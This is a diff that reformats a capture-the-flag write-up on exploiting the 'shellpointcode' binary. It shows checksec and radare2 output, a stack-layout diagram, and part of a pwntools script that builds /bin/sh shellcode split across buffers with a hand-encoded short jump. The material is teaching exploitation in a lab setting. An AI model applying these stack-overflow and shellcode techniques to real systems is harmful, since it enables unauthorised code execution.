@@ -22,7 +22,7 @@ $ pwn checksec shellpointcode
 ```
 No canary, RWX stack: no surprises here. This is a stack overflow alright.
 Do we, perhaps, have a handy `gets` call to complete the combo?
-```asm
+```
 $ r2 -AA shellpointcode
 # ...
 [0x00000720]> f | grep gets
@@ -30,7 +30,7 @@ $ r2 -AA shellpointcode
 0x000006e0 6 sym.imp.fgets
 ```
 No, that would be too easy. We do have a call to `fgets` though:
-```asm
+```
 [0x00000720]> axt @ sym.imp.fgets
 sym.goodbye 0x8cf [CALL] call sym.imp.fgets
 ```
@@ -165,7 +165,7 @@ The stack layout in `sym.nononode` is this:
   |         |
   |  buf_2  |  0x18 bytes
   |         |
-  ----------- 
+  -----------
 ->| next_2  |  0x08 bytes
 | ----------- <- rbp - 0x20
 | |         |
@@ -194,7 +194,7 @@ shc1 = '''
 movabs rbx, 0x68732f2f6e69622f  ; /bin//sh
 '''
 shc1 = asm(shc1)
-# pwn.asm won't assemble this; we must do it by hand 
+# pwn.asm won't assemble this; we must do it by hand
 offset = (0x18 - len(shc1)) + 0x8  # buffer is 0x18 bytes, then 0x8 for next ptr
 # [jump short rel8] is [0xeb [offset - 2]] because offset is from instr start
 shc1 += b'\xeb' + p8(offset - 2)
